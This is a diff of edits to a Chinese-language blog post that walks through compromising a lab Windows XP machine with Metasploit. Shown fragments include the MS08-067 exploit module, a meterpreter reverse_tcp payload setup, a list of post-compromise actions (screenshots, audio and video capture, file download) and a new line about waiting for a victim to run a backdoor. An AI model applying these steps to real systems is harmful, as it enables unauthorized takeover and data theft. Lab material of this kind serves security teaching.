@@ -3,9 +3,9 @@ layout: post
 title: 演示使用Metasploit入侵Windows
 ---
 
-我使用Kali Linux（192.168.0.112）；在同一局域网内有一台运行Windows XP（192.168.0.108）的测试电脑。
+我使用Kali Linux的IP地址是192.168.0.112；在同一局域网内有一台运行Windows XP（192.168.0.108）的测试电脑。
 
-使用漏洞入侵windows xp sp3。
+本文演示怎么使用Metasploit入侵windows xp sp3。
 
 启动msfconsole：
 
@@ -25,7 +25,7 @@ msf > search platform: windows xp sp3
 
 exploit/windows/smb/ms08_067_netapi是08年发现的漏洞，等级Great。
 
-查看某个漏洞的详细信息。包含使用方法、支持的平台等等，非常有帮助：
+查看某个漏洞的详细信息；包含使用方法、支持的平台等等，非常有帮助：
 
 {% highlight shell %}
 msf > info exploit/windows/smb/ms08_067_netapi
@@ -56,7 +56,7 @@ msf > use exploit/windows/smb/ms08_067_netapi
 meterpreter >
 ```
 
-现在你就可以控制目标主机了，截屏、录音、视频、下载文件、杀进程等等；使用help查看可以执行的命令。
+现在你就可以控制目标主机了，可以截屏、录音、视频、下载文件、杀进程等等；使用help查看可以执行的命令。
 
 ****
 
@@ -97,6 +97,8 @@ set payload windows/meterpreter/reverse_tcp
 show options
 exploit
 ```
+
+等待受害者启动后门程序。
 
 ![msfconsole]({{ site.baseurl }}/images/2016/4/Screenshot from 2016-04-15 19-01-13.png)
 
